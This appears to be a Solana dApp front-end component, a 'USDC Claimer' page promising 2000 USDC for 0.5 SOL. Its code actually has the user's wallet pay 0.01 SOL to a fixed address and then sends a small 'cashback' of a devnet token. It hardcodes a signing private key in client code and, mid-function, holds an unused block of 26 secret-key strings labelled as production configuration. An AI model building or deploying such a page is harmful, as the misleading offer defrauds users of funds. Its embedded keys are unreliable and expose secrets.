/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3ocxNBrq6nUjNrEk1b93U1xT7xN7utwNNHKPX65hfXeMYyp3FosXuc315cBstZGV8xcyfVJphv4spMUtA1EENked"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "S5m7P2Sh9Mse6N5q6UNVczbKKZAcnkrEVTiaQnuTmfuFi2nZGmXbkL38YL18PN4taa5Xa3oGktUP1AyThEnjNuG",
  "key1": "aRa5xr8ra98Y6QQP9o2LagFN7nDAAAu5ZrUM7z4c6PKhUKUY2K1x3Kx1QLgtBGB7qj7xFgQSpDPRC9QJyKZM3E5",
  "key2": "4nByi1zdQmfMdWjvF2mBj8gJk4vPoYbUe8v4rh6agMX9kDJPv3nA4gkez1M2j2JT6eyB5HuXecHZS4w52FdnCHqZ",
  "key3": "3KL4muz5VbUetNSd1E76sckrR6mPbp2sQXZDn9A3QKoN7wnoSz5oomtM6i6CA4nJWtxvoVrLCQybhUrjG2YsqE4R",
  "key4": "3mA7ZYpUgYEv9agRans8eyquNSz5sigYx5kbP7QNj5wotNQnSAfxgRCMNYxzU43SB2fM9q4ocfnhoUKyA5ibCKdQ",
  "key5": "Pj4KMgsukaMK61MBvmL5HvDZosK8LYrbukUYrJGkREuoZdGCFHVDeUtKBPMwDSg3BX7TroZjjUGyAjRkrVL2m5p",
  "key6": "48cQ4rPa97SEvN4qL6vURNkPxG1mBs5cb8fb4jCRH58G2MtBUSqqss748VGKmx3tBohg8zHYY8YQ7RKrqh4cBFu5",
  "key7": "5ipd81XzprTC5t1Gk8nSnehuxmsToNr9nVQv1Cuob9xrso9zaDxpRMD7xct7wLgYJX6SN4DNgsyyj5ZPujNQodxx",
  "key8": "4xzJvwRRp2qtWCLjDM4BmefiDNZ9H7yURmVXbZYm52yTRS9PUKeHrGotLnmfF5g54uagee6ghbdAmA4j2GzuvWzc",
  "key9": "2MF1xcZoiyC3bgNCd2f5aZcjGtk8fK8ycfKb6pHsTQkVTgDK9wwkk1HSoex7z33KpDxGQvvFRDv7YqikiwuEvMMV",
  "key10": "47yAjttTGnoKbdrdj5HxpiXUsiwa9vVyMQaCxxPdN7GzxwSptV8iumE3GdXDnT12p79BVp2gfYXNwfxViZeW6EmN",
  "key11": "3tTNB5YAV4TqbREmMqaRuDEFt8Z8XJ6B1vbH28zkMBZQUnxrmnYPYDZjR9S61dHXvjd5qvqjfBQ1zRc8HQxb4tY9",
  "key12": "38hMCyreHPUypnqSKwkq6S3Yqns5o3QrDRhYGD4sCkp2ufa55JTYNBJWL7PBfCnPB1SSpVmjrU2AjutPyiuejhqo",
  "key13": "5yZwbgPhhDD1U1o2LNES1EXgf1TjY2Xy9f4V9LZzeKSpNatHNNzkTAkcUZxuLvoVgvXMrexYN4xTJTzG7HeMRTRQ",
  "key14": "5dk5ZZvX8NKjQNoihKmK64gakjr4TFhs7Lkj5fdHkTynBsNDGUbCmSMaCTFLHj9UehJYSbk7fc7ct3wjRypE7npF",
  "key15": "5CpRLkQgUHoCg7dPE3GqUUVtDzbYcyy93ymUNNh4bRx32DUNQXdZwF81X93ALBXmjQwKKhNNPMwN3wJQXsZiE9FK",
  "key16": "k8oYiAs74TyqWzr7YRRzAdsWHMY1nNqcxZMYoSq5TFTomhFZ95V7cK6rKMEQ4rShEqoKY2m4HcD5S3sEDdWX7Mo",
  "key17": "4NizJn8hUVnuisZKLdNbXxnQJbPvo4PPsswYUWRxU3oV7ukjxP5LfkxTtdmsRp2ZNTH9NPcDgedgHTLhK6Pjscje",
  "key18": "3vsvAgYTAXb4zxYzWFy43q7xmGTURqveg3YURyjWULXbJx8iu4yVZceY5D7cZ5tK2FJuUx3j8f66ycQsyTPFUhCR",
  "key19": "3GqmyDAX9pBMNoH3BxazBFkan2eZ71czEcXRy84pcNhAd3gmZqBNEdpFHPTnfPQoGHgvkcoftosnAuYMttLePpzu",
  "key20": "f4DGkSUSxGeyi1DhYPJk1Vzfb5Fz2ExnFcWtwUSdn7Pu7Jrh4MdVyNFHvmr2GRdna2HBofDEmc46xH1YaQywSDY",
  "key21": "2bVhFVSvHwU869LvbVDd3QJQWMyfuo5q9z4hKsBtHcWw3drbeCF2wt4SujXdvPczoi7kmAJmtVwsX7ZV62B3NWVa",
  "key22": "4rc7wxoAX9jGJjrNoT51PfNN7o3WuMsiHZ12pu7F8oYN4dYqEBHy6YV98Axz3go3wUHNtf4bM3aQHGAYeXfGcc68",
  "key23": "5FweDN4khooYMRGcPjbNATp5a4vGo5FoZUxaJc46bjEoz2tAjGeQEG7Lmd1mJ6iLxCHDDbkwZP6LdgjqNwyCrsSM",
  "key24": "3Ny8FfpU9GEYcZ7WLPGVKHaTAbAr594FEqHzckhtcdwSZRSbdQBdxtAPgM6zTShD5CoPBxzEAqAAeizLVqYwHw2Y",
  "key25": "2oHck6mEdWC6WCVc61ya1tJMxivVAVAkZjyu8xxX6EDCxZkVWVLhSMc7TzKhM3WJFBjMiF56Q2P7pT3uCMZgSsw8"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
